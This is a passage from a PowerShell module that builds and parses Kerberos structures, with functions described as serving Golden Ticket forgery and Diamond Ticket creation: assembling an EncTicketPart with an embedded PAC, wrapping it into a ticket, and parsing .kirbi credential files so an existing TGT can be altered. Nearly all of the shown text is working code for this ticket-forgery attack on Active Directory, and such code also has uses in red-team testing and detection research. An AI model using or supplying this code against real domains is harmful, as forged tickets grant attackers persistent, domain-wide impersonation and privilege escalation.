    if ($TransitedPolicyChecked)  { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_TRANSITED_POLICY_CHECKED)) }
    if ($OkAsDelegate)            { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_OK_AS_DELEGATE)) }
    if ($Anonymous)               { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_ANONYMOUS)) }
    if ($NameCanonicalize)        { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_NAME_CANONICALIZE)) }
    if ($EncPaRep)                { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_ENC_PA_REP)) }

    # Convert to big-endian bytes
    return [byte[]]@(
        (($flags -shr 24) -band 0xFF),
        (($flags -shr 16) -band 0xFF),
        (($flags -shr 8) -band 0xFF),
        ($flags -band 0xFF)
    )
}

<#
.SYNOPSIS
    Creates a TransitedEncoding structure.
.DESCRIPTION
    TransitedEncoding ::= SEQUENCE {
        tr-type [0] Int32 -- 1 = DOMAIN-X500-COMPRESS
        contents [1] OCTET STRING
    }
    For tickets that didn't cross realm boundaries, contents is empty.
#>
function New-TransitedEncoding {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [int]$TransitType = 0,  # Rubeus uses 0 for non-cross-realm tickets

        [Parameter(Mandatory=$false)]
        [byte[]]$Contents = @()
    )

    $trTypeASN = New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $TransitType)
    $contentsASN = New-ASN1ContextTag -Tag 1 -Data (New-ASN1OctetString -Value $Contents)

    return New-ASN1Sequence -Data ($trTypeASN + $contentsASN)
}

<#
.SYNOPSIS
    Creates an AuthorizationData structure for PAC embedding.
.DESCRIPTION
    AuthorizationData ::= SEQUENCE OF SEQUENCE {
        ad-type [0] Int32,
        ad-data [1] OCTET STRING
    }
    For PAC, we use AD-IF-RELEVANT containing AD-WIN2K-PAC.
#>
function New-AuthorizationData {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [int]$ADType,

        [Parameter(Mandatory=$true)]
        [byte[]]$ADData
    )

    $adTypeASN = New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $ADType)
    $adDataASN = New-ASN1ContextTag -Tag 1 -Data (New-ASN1OctetString -Value $ADData)

    $adEntry = New-ASN1Sequence -Data ($adTypeASN + $adDataASN)

    return New-ASN1Sequence -Data $adEntry
}

<#
.SYNOPSIS
    Creates a nested AuthorizationData structure with PAC.
.DESCRIPTION
    For Windows PAC, the structure is:
    AD-IF-RELEVANT [1] containing:
        AD-WIN2K-PAC [128] containing:
            PAC binary data
#>
function New-PACAuthorizationData {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$PACData
    )

    # Inner: AD-WIN2K-PAC with PAC data
    $pacAdTypeASN = New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $Script:AD_WIN2K_PAC)
    $pacAdDataASN = New-ASN1ContextTag -Tag 1 -Data (New-ASN1OctetString -Value $PACData)
    $pacAdEntry = New-ASN1Sequence -Data ($pacAdTypeASN + $pacAdDataASN)
    $pacAdSeq = New-ASN1Sequence -Data $pacAdEntry

    # Outer: AD-IF-RELEVANT containing the PAC AD
    $ifRelevantTypeASN = New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $Script:AD_IF_RELEVANT)
    $ifRelevantDataASN = New-ASN1ContextTag -Tag 1 -Data (New-ASN1OctetString -Value $pacAdSeq)
    $ifRelevantEntry = New-ASN1Sequence -Data ($ifRelevantTypeASN + $ifRelevantDataASN)

    return New-ASN1Sequence -Data $ifRelevantEntry
}

<#
.SYNOPSIS
    Creates an EncTicketPart structure for Golden Ticket.

.DESCRIPTION
    Builds the encrypted portion of a Kerberos ticket.

    EncTicketPart ::= [APPLICATION 3] SEQUENCE {
        flags [0] TicketFlags,
        key [1] EncryptionKey,
        crealm [2] Realm,
        cname [3] PrincipalName,
        transited [4] TransitedEncoding,
        authtime [5] KerberosTime,
        starttime [6] KerberosTime OPTIONAL,
        endtime [7] KerberosTime,
        renew-till [8] KerberosTime OPTIONAL,
        caddr [9] HostAddresses OPTIONAL,
        authorization-data [10] AuthorizationData OPTIONAL
    }

.PARAMETER SessionKey
    The session key bytes.

.PARAMETER SessionKeyType
    The encryption type of the session key (17, 18, or 23).

.PARAMETER ClientRealm
    The client's realm (domain name in uppercase).

.PARAMETER ClientName
    The client principal name (sAMAccountName).

.PARAMETER AuthTime
    Authentication time.

.PARAMETER StartTime
    Optional ticket start time.

.PARAMETER EndTime
    Ticket expiration time.

.PARAMETER RenewTill
    Optional renewal time.

.PARAMETER PACData
    Optional PAC bytes to embed in authorization-data.

.PARAMETER TicketFlags
    Optional 4-byte ticket flags. Defaults to standard TGT flags.

.OUTPUTS
    Byte array containing the EncTicketPart structure (unencrypted).
#>
function New-EncTicketPart {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$SessionKey,

        [Parameter(Mandatory=$true)]
        [int]$SessionKeyType,

        [Parameter(Mandatory=$true)]
        [string]$ClientRealm,

        [Parameter(Mandatory=$true)]
        [string]$ClientName,

        [Parameter(Mandatory=$true)]
        [datetime]$AuthTime,

        [Parameter(Mandatory=$false)]
        [datetime]$StartTime,

        [Parameter(Mandatory=$true)]
        [datetime]$EndTime,

        [Parameter(Mandatory=$false)]
        [datetime]$RenewTill,

        [Parameter(Mandatory=$false)]
        [byte[]]$PACData,

        [Parameter(Mandatory=$false)]
        [byte[]]$TicketFlags
    )

    # Default flags: Forwardable, Renewable, Initial, Pre-Authent
    if (-not $TicketFlags -or $TicketFlags.Length -ne 4) {
        $TicketFlags = New-TicketFlags -Forwardable -Renewable -Initial -PreAuthent
    }

    $content = @()

    # [0] flags - TicketFlags
    $content += New-ASN1ContextTag -Tag 0 -Data (New-ASN1BitString -Value $TicketFlags)

    # [1] key - EncryptionKey
    $keyContent = @()
    $keyContent += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $SessionKeyType)
    $keyContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1OctetString -Value $SessionKey)
    $encKey = New-ASN1Sequence -Data $keyContent
    $content += New-ASN1ContextTag -Tag 1 -Data $encKey

    # [2] crealm - Realm
    $content += New-ASN1ContextTag -Tag 2 -Data (New-ASN1GeneralString -Value $ClientRealm.ToUpper())

    # [3] cname - PrincipalName (NT-PRINCIPAL = 1)
    $cnameContent = @()
    $cnameContent += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 1)  # NT-PRINCIPAL
    $cnameContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1Sequence -Data (New-ASN1GeneralString -Value $ClientName))
    $content += New-ASN1ContextTag -Tag 3 -Data (New-ASN1Sequence -Data $cnameContent)

    # [4] transited - TransitedEncoding (empty for non-cross-realm)
    $content += New-ASN1ContextTag -Tag 4 -Data (New-TransitedEncoding)

    # [5] authtime - KerberosTime
    $content += New-ASN1ContextTag -Tag 5 -Data (New-ASN1GeneralizedTime -Value $AuthTime)

    # [6] starttime - KerberosTime OPTIONAL
    if ($StartTime) {
        $content += New-ASN1ContextTag -Tag 6 -Data (New-ASN1GeneralizedTime -Value $StartTime)
    }

    # [7] endtime - KerberosTime
    $content += New-ASN1ContextTag -Tag 7 -Data (New-ASN1GeneralizedTime -Value $EndTime)

    # [8] renew-till - KerberosTime OPTIONAL
    if ($RenewTill) {
        $content += New-ASN1ContextTag -Tag 8 -Data (New-ASN1GeneralizedTime -Value $RenewTill)
    }

    # [9] caddr - HostAddresses OPTIONAL (not included for golden tickets)

    # [10] authorization-data - AuthorizationData OPTIONAL (contains PAC)
    if ($PACData -and $PACData.Length -gt 0) {
        $authzData = New-PACAuthorizationData -PACData $PACData
        $content += New-ASN1ContextTag -Tag 10 -Data $authzData
    }

    # Wrap in SEQUENCE and APPLICATION 3 tag
    $encTicketPartSeq = New-ASN1Sequence -Data $content
    return New-ASN1ApplicationTag -Tag 3 -Data $encTicketPartSeq
}

<#
.SYNOPSIS
    Creates a complete Ticket structure.

.DESCRIPTION
    Builds a Kerberos Ticket structure ready for inclusion in KRB-CRED.

    Ticket ::= [APPLICATION 6] SEQUENCE {
        tkt-vno [0] INTEGER (5),
        realm [1] Realm,
        sname [2] PrincipalName,
        enc-part [3] EncryptedData
    }

.PARAMETER Realm
    The realm (domain name in uppercase).

.PARAMETER ServerName
    The server principal name (e.g., "krbtgt" for TGT).

.PARAMETER ServerInstance
    The server instance (e.g., realm for TGT).

.PARAMETER EncryptedPart
    The encrypted EncTicketPart bytes.

.PARAMETER EncryptionType
    The encryption type used (17, 18, or 23).

.PARAMETER Kvno
    Key version number (optional, typically 2 for krbtgt).

.OUTPUTS
    Byte array containing the complete Ticket structure.
#>
function New-KerberosTicket {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Realm,

        [Parameter(Mandatory=$true)]
        [string]$ServerName,

        [Parameter(Mandatory=$false)]
        [string]$ServerInstance,

        [Parameter(Mandatory=$true)]
        [byte[]]$EncryptedPart,

        [Parameter(Mandatory=$true)]
        [int]$EncryptionType,

        [Parameter(Mandatory=$false)]
        [int]$Kvno = 2
    )

    $content = @()

    # [0] tkt-vno - INTEGER (5)
    $content += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 5)

    # [1] realm - Realm
    $content += New-ASN1ContextTag -Tag 1 -Data (New-ASN1GeneralString -Value $Realm.ToUpper())

    # [2] sname - PrincipalName
    if ($ServerInstance) {
        # NT-SRV-INST (2) for krbtgt/REALM
        $snameContent = @()
        $snameContent += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 2)  # NT-SRV-INST
        $nameSeq = (New-ASN1GeneralString -Value $ServerName) + (New-ASN1GeneralString -Value $ServerInstance)
        $snameContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1Sequence -Data $nameSeq)
        $content += New-ASN1ContextTag -Tag 2 -Data (New-ASN1Sequence -Data $snameContent)
    }
    else {
        # NT-PRINCIPAL (1)
        $snameContent = @()
        $snameContent += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 1)
        $snameContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1Sequence -Data (New-ASN1GeneralString -Value $ServerName))
        $content += New-ASN1ContextTag -Tag 2 -Data (New-ASN1Sequence -Data $snameContent)
    }

    # [3] enc-part - EncryptedData
    $encDataContent = @()
    $encDataContent += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $EncryptionType)
    $encDataContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value $Kvno)
    $encDataContent += New-ASN1ContextTag -Tag 2 -Data (New-ASN1OctetString -Value $EncryptedPart)
    $encData = New-ASN1Sequence -Data $encDataContent
    $content += New-ASN1ContextTag -Tag 3 -Data $encData

    # Wrap in SEQUENCE and APPLICATION 1 tag (RFC 4120: Ticket ::= [APPLICATION 1] SEQUENCE {...})
    $ticketSeq = New-ASN1Sequence -Data $content
    return New-ASN1ApplicationTag -Tag 1 -Data $ticketSeq
}

#endregion

#region KRB-CRED Parser (for Diamond Tickets)

<#
.SYNOPSIS
    Parses a KRB-CRED (.kirbi) structure.

.DESCRIPTION
    Extracts ticket, session key, and metadata from a KRB-CRED structure.
    Used for Diamond Ticket creation where we need to modify an existing TGT.

    KRB-CRED ::= [APPLICATION 22] SEQUENCE {
        pvno [0] INTEGER (5),
        msg-type [1] INTEGER (22),
        tickets [2] SEQUENCE OF Ticket,
        enc-part [3] EncryptedData -- EncKrbCredPart
    }

.PARAMETER KirbiBytes
    The raw .kirbi file bytes.

.OUTPUTS
    PSCustomObject with:
    - Ticket: Raw ticket bytes (APPLICATION 6)
    - TicketRealm: Server realm
    - TicketSName: Server principal name
    - TicketEncPart: Encrypted ticket part (cipher bytes)
    - TicketEType: Encryption type
    - TicketKvno: Key version number
    - SessionKey: Session key bytes
    - SessionKeyType: Session key encryption type
    - ClientRealm: Client realm
    - ClientName: Client principal name
    - StartTime, EndTime, RenewTill: Ticket times
    - TicketFlags: Ticket flags bytes

.EXAMPLE
    $parsed = Read-KRBCred -KirbiBytes ([IO.File]::ReadAllBytes("ticket.kirbi"))
#>
function Read-KRBCred {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$KirbiBytes
    )

    try {
        $offset = 0

        Write-Log "[Read-KRBCred] Input: $($KirbiBytes.Length) bytes, first bytes: 0x$($KirbiBytes[0].ToString('X2')) 0x$($KirbiBytes[1].ToString('X2')) 0x$($KirbiBytes[2].ToString('X2'))"

        # Parse APPLICATION 22 tag
        $element = Read-ASN1Element -Data $KirbiBytes -Offset $offset
        if ($element.Tag -ne 0x76) {  # APPLICATION 22 = 0x40 + 0x20 + 22 = 0x76
            throw "Invalid KRB-CRED: Expected APPLICATION 22 tag, got 0x$($element.Tag.ToString('X2'))"
        }

        Write-Log "[Read-KRBCred] APPLICATION 22 parsed, content: $($element.ContentLength) bytes"

        # Parse inner SEQUENCE
        $innerOffset = 0
        $innerData = $element.Content
        $seqElement = Read-ASN1Element -Data $innerData -Offset $innerOffset

        if ($seqElement.Tag -ne 0x30) {
            throw "Invalid KRB-CRED: Expected SEQUENCE, got 0x$($seqElement.Tag.ToString('X2'))"
        }

        Write-Log "[Read-KRBCred] SEQUENCE parsed, content: $($seqElement.ContentLength) bytes"

        # Parse SEQUENCE children
        $children = Read-ASN1Children -Data $seqElement.Content
        Write-Log "[Read-KRBCred] Found $($children.Count) children in KRB-CRED SEQUENCE"

        $result = [PSCustomObject]@{
            Ticket = $null
            TicketRealm = $null
            TicketSName = $null
            TicketEncPart = $null
            TicketEType = 0
            TicketKvno = 0
            SessionKey = $null
            SessionKeyType = 0
            ClientRealm = $null
            ClientName = $null
            ServerRealm = $null
            ServerName = $null
            StartTime = $null
            EndTime = $null
            RenewTill = $null
            AuthTime = $null
            TicketFlags = $null
        }

        foreach ($child in $children) {
            $contextTag = $child.Tag -band 0x1F
            Write-Log "[Read-KRBCred] Processing child: tag=0x$($child.Tag.ToString('X2')), contextTag=$contextTag, contentLen=$($child.ContentLength)"

            switch ($contextTag) {
                0 {
                    # pvno [0] INTEGER - should be 5
                    $pvnoElement = Read-ASN1Element -Data $child.Content -Offset 0
                    $pvno = Read-ASN1Integer -Content $pvnoElement.Content
                    Write-Log "[Read-KRBCred] pvno = $pvno"
                    if ($pvno -ne 5) {
                        Write-Log "[Read-KRBCred] Warning: pvno is $pvno, expected 5"
                    }
                }
                1 {
                    # msg-type [1] INTEGER - should be 22
                    $msgTypeElement = Read-ASN1Element -Data $child.Content -Offset 0
                    $msgType = Read-ASN1Integer -Content $msgTypeElement.Content
                    Write-Log "[Read-KRBCred] msg-type = $msgType"
                    if ($msgType -ne 22) {
                        Write-Log "[Read-KRBCred] Warning: msg-type is $msgType, expected 22"
                    }
                }
                2 {
                    # tickets [2] SEQUENCE OF Ticket
                    Write-Log "[Read-KRBCred] Parsing tickets [2], child.Content first bytes: 0x$($child.Content[0].ToString('X2')) 0x$($child.Content[1].ToString('X2')), length=$($child.Content.Length)"
                    $ticketsSeq = Read-ASN1Element -Data $child.Content -Offset 0
                    Write-Log "[Read-KRBCred] ticketsSeq: tag=0x$($ticketsSeq.Tag.ToString('X2')), contentLen=$($ticketsSeq.ContentLength), first content bytes: 0x$($ticketsSeq.Content[0].ToString('X2')) 0x$($ticketsSeq.Content[1].ToString('X2'))"
                    $ticketElements = Read-ASN1Children -Data $ticketsSeq.Content
                    Write-Log "[Read-KRBCred] Found $($ticketElements.Count) ticket element(s)"

                    if ($ticketElements.Count -gt 0) {
                        # Get first ticket (APPLICATION 1 per RFC 4120)
                        $ticketElement = $ticketElements[0]
                        Write-Log "[Read-KRBCred] First ticket element: tag=0x$($ticketElement.Tag.ToString('X2')), totalLen=$($ticketElement.TotalLength)"

                        # Store raw ticket bytes (including APPLICATION tag)
                        # Read-ASN1Children parses from $ticketsSeq.Content, so ticket
                        # raw bytes are in $ticketsSeq.Content (NOT $child.Content which
                        # includes the outer SEQUENCE header).
                        # For the first element, offset within $ticketsSeq.Content is 0.
                        $result.Ticket = $ticketsSeq.Content[0..($ticketElement.TotalLength - 1)]
                        Write-Log "[Read-KRBCred] Extracted ticket: $($result.Ticket.Length) bytes, first byte: 0x$($result.Ticket[0].ToString('X2'))"

                        # Parse ticket structure
                        $ticketInfo = Read-KerberosTicket -TicketBytes $result.Ticket
                        Write-Log "[Read-KRBCred] Ticket parsed: Realm=$($ticketInfo.Realm), SName=$($ticketInfo.SName), EType=$($ticketInfo.EType), EncPart length=$($ticketInfo.EncPart.Length)"
                        $result.TicketRealm = $ticketInfo.Realm
                        $result.TicketSName = $ticketInfo.SName
                        $result.TicketEncPart = $ticketInfo.EncPart
                        $result.TicketEType = $ticketInfo.EType
                        $result.TicketKvno = $ticketInfo.Kvno
                    }
                    else {
                        Write-Log "[Read-KRBCred] WARNING: No ticket elements found in SEQUENCE!" -Level Warning
                    }
                }
                3 {
                    # enc-part [3] EncryptedData (EncKrbCredPart)
                    # For .kirbi files, this is typically etype 0 (unencrypted)
                    $encDataElement = Read-ASN1Element -Data $child.Content -Offset 0
                    $encDataChildren = Read-ASN1Children -Data $encDataElement.Content

                    foreach ($encChild in $encDataChildren) {
                        $encTag = $encChild.Tag -band 0x1F
                        if ($encTag -eq 2) {
                            # cipher [2] - contains EncKrbCredPart
                            $cipherElement = Read-ASN1Element -Data $encChild.Content -Offset 0
                            $encKrbCredPart = $cipherElement.Content

                            # Parse EncKrbCredPart [APPLICATION 29]
                            $credPartInfo = Read-EncKrbCredPart -EncKrbCredPartBytes $encKrbCredPart
                            $result.SessionKey = $credPartInfo.SessionKey
                            $result.SessionKeyType = $credPartInfo.SessionKeyType
                            $result.ClientRealm = $credPartInfo.ClientRealm
                            $result.ClientName = $credPartInfo.ClientName
                            $result.ServerRealm = $credPartInfo.ServerRealm
                            $result.ServerName = $credPartInfo.ServerName
                            $result.StartTime = $credPartInfo.StartTime
                            $result.EndTime = $credPartInfo.EndTime
                            $result.RenewTill = $credPartInfo.RenewTill
                            $result.AuthTime = $credPartInfo.AuthTime
                            $result.TicketFlags = $credPartInfo.TicketFlags
                        }
                    }
                }
            }
        }

        Write-Log "[Read-KRBCred] Parsing complete. Ticket=$($null -ne $result.Ticket), TicketEncPart=$($null -ne $result.TicketEncPart), SessionKey=$($null -ne $result.SessionKey), EType=$($result.TicketEType)"
        return $result
    }
    catch {
        Write-Log "[Read-KRBCred] Parse error: $_ at $($_.ScriptStackTrace)" -Level Error
        throw "Failed to parse KRB-CRED: $_"
    }
}

<#
.SYNOPSIS
    Parses a Kerberos Ticket structure.
#>
function Read-KerberosTicket {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$TicketBytes
    )

    $result = @{
        Realm = $null
        SName = $null
        EncPart = $null
        EType = 0
        Kvno = 0
    }

    # Parse APPLICATION tag (RFC 4120: Ticket ::= [APPLICATION 1], but accept both 1 and 6 for compatibility)
    $element = Read-ASN1Element -Data $TicketBytes -Offset 0
    $appTag = $element.Tag -band 0x1F
    if ($appTag -ne 1 -and $appTag -ne 6) {
        throw "Invalid Ticket: Expected APPLICATION 1 (or legacy 6), got tag $appTag"
    }

    # Parse inner SEQUENCE
    $seqElement = Read-ASN1Element -Data $element.Content -Offset 0
    $children = Read-ASN1Children -Data $seqElement.Content

    foreach ($child in $children) {
        $contextTag = $child.Tag -band 0x1F

        switch ($contextTag) {
            1 {
                # realm [1] Realm (GeneralString)
                $realmElement = Read-ASN1Element -Data $child.Content -Offset 0
                $result.Realm = Read-ASN1String -Content $realmElement.Content
            }
            2 {
                # sname [2] PrincipalName
                $snameSeq = Read-ASN1Element -Data $child.Content -Offset 0
                $snameChildren = Read-ASN1Children -Data $snameSeq.Content

                $nameStrings = @()
                foreach ($snameChild in $snameChildren) {
                    $snameTag = $snameChild.Tag -band 0x1F
                    if ($snameTag -eq 1) {
                        # name-string [1] SEQUENCE OF GeneralString
                        $nameSeq = Read-ASN1Element -Data $snameChild.Content -Offset 0
                        $nameElements = Read-ASN1Children -Data $nameSeq.Content
                        foreach ($nameEl in $nameElements) {
                            $nameStrings += Read-ASN1String -Content $nameEl.Content
                        }
                    }
                }
                $result.SName = $nameStrings -join '/'
            }
            3 {
                # enc-part [3] EncryptedData
                $encDataSeq = Read-ASN1Element -Data $child.Content -Offset 0
                $encDataChildren = Read-ASN1Children -Data $encDataSeq.Content

                foreach ($encChild in $encDataChildren) {
                    $encTag = $encChild.Tag -band 0x1F
                    switch ($encTag) {
                        0 {
                            # etype [0] Int32
                            $etypeEl = Read-ASN1Element -Data $encChild.Content -Offset 0
                            $result.EType = Read-ASN1Integer -Content $etypeEl.Content
                        }
                        1 {
                            # kvno [1] UInt32
                            $kvnoEl = Read-ASN1Element -Data $encChild.Content -Offset 0
                            $result.Kvno = Read-ASN1Integer -Content $kvnoEl.Content
                        }
                        2 {
                            # cipher [2] OCTET STRING
                            $cipherEl = Read-ASN1Element -Data $encChild.Content -Offset 0
                            $result.EncPart = $cipherEl.Content
                        }
                    }
                }
            }
        }
    }

    return $result
}

<#
.SYNOPSIS
    Parses an EncKrbCredPart structure.
#>
function Read-EncKrbCredPart {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$EncKrbCredPartBytes
    )

    $result = @{
        SessionKey = $null
        SessionKeyType = 0
        ClientRealm = $null
        ClientName = $null
        ServerRealm = $null
        ServerName = $null
        StartTime = $null
        EndTime = $null
        RenewTill = $null
        AuthTime = $null
        TicketFlags = $null
    }

    # Parse APPLICATION 29 tag
    $element = Read-ASN1Element -Data $EncKrbCredPartBytes -Offset 0
    if (($element.Tag -band 0x1F) -ne 29) {
        throw "Invalid EncKrbCredPart: Expected APPLICATION 29"
    }

    # Parse inner SEQUENCE
    $seqElement = Read-ASN1Element -Data $element.Content -Offset 0
    $children = Read-ASN1Children -Data $seqElement.Content

    foreach ($child in $children) {
        $contextTag = $child.Tag -band 0x1F

        if ($contextTag -eq 0) {
            # ticket-info [0] SEQUENCE OF KrbCredInfo
            $ticketInfoSeq = Read-ASN1Element -Data $child.Content -Offset 0
            $credInfoElements = Read-ASN1Children -Data $ticketInfoSeq.Content

            if ($credInfoElements.Count -gt 0) {
                # Parse first KrbCredInfo
                $credInfoSeq = $credInfoElements[0]
                $credInfoChildren = Read-ASN1Children -Data $credInfoSeq.Content

                foreach ($credChild in $credInfoChildren) {
                    $credTag = $credChild.Tag -band 0x1F

                    switch ($credTag) {
                        0 {
                            # key [0] EncryptionKey
                            $keySeq = Read-ASN1Element -Data $credChild.Content -Offset 0
                            $keyChildren = Read-ASN1Children -Data $keySeq.Content

                            foreach ($keyChild in $keyChildren) {
                                $keyTag = $keyChild.Tag -band 0x1F
                                if ($keyTag -eq 0) {
                                    # keytype [0] Int32
                                    $ktEl = Read-ASN1Element -Data $keyChild.Content -Offset 0
                                    $result.SessionKeyType = Read-ASN1Integer -Content $ktEl.Content
                                }
                                elseif ($keyTag -eq 1) {
                                    # keyvalue [1] OCTET STRING
                                    $kvEl = Read-ASN1Element -Data $keyChild.Content -Offset 0
                                    $result.SessionKey = $kvEl.Content
                                }
                            }
                        }
                        1 {
                            # prealm [1] Realm (client realm)
                            $realmEl = Read-ASN1Element -Data $credChild.Content -Offset 0
                            $result.ClientRealm = Read-ASN1String -Content $realmEl.Content
                        }
                        2 {
                            # pname [2] PrincipalName (client name)
                            $pnameSeq = Read-ASN1Element -Data $credChild.Content -Offset 0
                            $pnameChildren = Read-ASN1Children -Data $pnameSeq.Content

                            foreach ($pnameChild in $pnameChildren) {
                                if (($pnameChild.Tag -band 0x1F) -eq 1) {
                                    $nameSeq = Read-ASN1Element -Data $pnameChild.Content -Offset 0
                                    $nameElements = Read-ASN1Children -Data $nameSeq.Content
                                    if ($nameElements.Count -gt 0) {
                                        $result.ClientName = Read-ASN1String -Content $nameElements[0].Content
                                    }
                                }
                            }
                        }
                        3 {
                            # flags [3] TicketFlags
                            $flagsEl = Read-ASN1Element -Data $credChild.Content -Offset 0
                            $flagsData = Read-ASN1BitString -Content $flagsEl.Content
                            $result.TicketFlags = $flagsData.Data
                        }
                        4 {
                            # authtime [4] KerberosTime
                            $timeEl = Read-ASN1Element -Data $credChild.Content -Offset 0
                            $result.AuthTime = Read-ASN1GeneralizedTime -Content $timeEl.Content
                        }
                        5 {
                            # starttime [5] KerberosTime
                            $timeEl = Read-ASN1Element -Data $credChild.Content -Offset 0
                            $result.StartTime = Read-ASN1GeneralizedTime -Content $timeEl.Content
                        }
                        6 {
                            # endtime [6] KerberosTime
                            $timeEl = Read-ASN1Element -Data $credChild.Content -Offset 0
                            $result.EndTime = Read-ASN1GeneralizedTime -Content $timeEl.Content
                        }
                        7 {
                            # renew-till [7] KerberosTime
                            $timeEl = Read-ASN1Element -Data $credChild.Content -Offset 0
                            $result.RenewTill = Read-ASN1GeneralizedTime -Content $timeEl.Content
                        }
                        8 {
                            # srealm [8] Realm (server realm)
                            $realmEl = Read-ASN1Element -Data $credChild.Content -Offset 0
                            $result.ServerRealm = Read-ASN1String -Content $realmEl.Content
                        }
                        9 {
                            # sname [9] PrincipalName (server name)
                            $snameSeq = Read-ASN1Element -Data $credChild.Content -Offset 0
                            $snameChildren = Read-ASN1Children -Data $snameSeq.Content

                            $nameStrings = @()
                            foreach ($snameChild in $snameChildren) {
                                if (($snameChild.Tag -band 0x1F) -eq 1) {
                                    $nameSeq = Read-ASN1Element -Data $snameChild.Content -Offset 0
                                    $nameElements = Read-ASN1Children -Data $nameSeq.Content
                                    foreach ($nameEl in $nameElements) {
                                        $nameStrings += Read-ASN1String -Content $nameEl.Content
                                    }
                                }
                            }
                            $result.ServerName = $nameStrings -join '/'
                        }
                    }
                }
            }
        }
    }

    return $result
}

<#
.SYNOPSIS
    Parses an EncTicketPart structure (decrypted ticket content).

.DESCRIPTION
    Extracts all fields from a decrypted EncTicketPart including the PAC.

    EncTicketPart ::= [APPLICATION 3] SEQUENCE {
        flags [0] TicketFlags,
        key [1] EncryptionKey,
        crealm [2] Realm,
        cname [3] PrincipalName,
        transited [4] TransitedEncoding,
        authtime [5] KerberosTime,
        starttime [6] KerberosTime OPTIONAL,
        endtime [7] KerberosTime,
        renew-till [8] KerberosTime OPTIONAL,
        caddr [9] HostAddresses OPTIONAL,
        authorization-data [10] AuthorizationData OPTIONAL
    }

.PARAMETER EncTicketPartBytes
    The decrypted EncTicketPart bytes (starting with APPLICATION 3 tag).

.OUTPUTS
    PSCustomObject with all parsed fields including PAC.
#>
function Read-EncTicketPart {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$EncTicketPartBytes
    )

    $result = [PSCustomObject]@{
        Flags = $null
        SessionKey = $null
        SessionKeyType = 0
        ClientRealm = $null
        ClientName = $null
        Transited = $null
        AuthTime = $null
        StartTime = $null
        EndTime = $null
        RenewTill = $null
        ClientAddresses = $null
        AuthorizationData = $null
        PAC = $null
    }

    # Parse APPLICATION 3 tag
    $element = Read-ASN1Element -Data $EncTicketPartBytes -Offset 0
    if (($element.Tag -band 0x1F) -ne 3) {
        throw "Invalid EncTicketPart: Expected APPLICATION 3, got tag 0x$($element.Tag.ToString('X2'))"
    }

    # Parse inner SEQUENCE
    $seqElement = Read-ASN1Element -Data $element.Content -Offset 0
    $children = Read-ASN1Children -Data $seqElement.Content

    foreach ($child in $children) {
        $contextTag = $child.Tag -band 0x1F

        switch ($contextTag) {
            0 {
                # flags [0] TicketFlags
                $flagsEl = Read-ASN1Element -Data $child.Content -Offset 0
                $flagsData = Read-ASN1BitString -Content $flagsEl.Content
                $result.Flags = $flagsData.Data
            }
            1 {
                # key [1] EncryptionKey
                $keySeq = Read-ASN1Element -Data $child.Content -Offset 0
                $keyChildren = Read-ASN1Children -Data $keySeq.Content

                foreach ($keyChild in $keyChildren) {
                    $keyTag = $keyChild.Tag -band 0x1F
                    if ($keyTag -eq 0) {
                        $ktEl = Read-ASN1Element -Data $keyChild.Content -Offset 0
                        $result.SessionKeyType = Read-ASN1Integer -Content $ktEl.Content
                    }
                    elseif ($keyTag -eq 1) {
                        $kvEl = Read-ASN1Element -Data $keyChild.Content -Offset 0
                        $result.SessionKey = $kvEl.Content
                    }
                }
            }
            2 {
                # crealm [2] Realm
                $realmEl = Read-ASN1Element -Data $child.Content -Offset 0
                $result.ClientRealm = Read-ASN1String -Content $realmEl.Content
            }
            3 {
                # cname [3] PrincipalName
                $cnameSeq = Read-ASN1Element -Data $child.Content -Offset 0
                $cnameChildren = Read-ASN1Children -Data $cnameSeq.Content

                foreach ($cnameChild in $cnameChildren) {
                    if (($cnameChild.Tag -band 0x1F) -eq 1) {
                        $nameSeq = Read-ASN1Element -Data $cnameChild.Content -Offset 0
                        $nameElements = Read-ASN1Children -Data $nameSeq.Content
                        if ($nameElements.Count -gt 0) {
                            $result.ClientName = Read-ASN1String -Content $nameElements[0].Content
                        }
                    }
                }
            }
            4 {
                # transited [4] TransitedEncoding
                $transitedSeq = Read-ASN1Element -Data $child.Content -Offset 0
                $result.Transited = $transitedSeq.Content
            }
            5 {
                # authtime [5] KerberosTime
                $timeEl = Read-ASN1Element -Data $child.Content -Offset 0
                $result.AuthTime = Read-ASN1GeneralizedTime -Content $timeEl.Content
            }
            6 {
                # starttime [6] KerberosTime OPTIONAL
                $timeEl = Read-ASN1Element -Data $child.Content -Offset 0
                $result.StartTime = Read-ASN1GeneralizedTime -Content $timeEl.Content
            }
            7 {
                # endtime [7] KerberosTime
                $timeEl = Read-ASN1Element -Data $child.Content -Offset 0
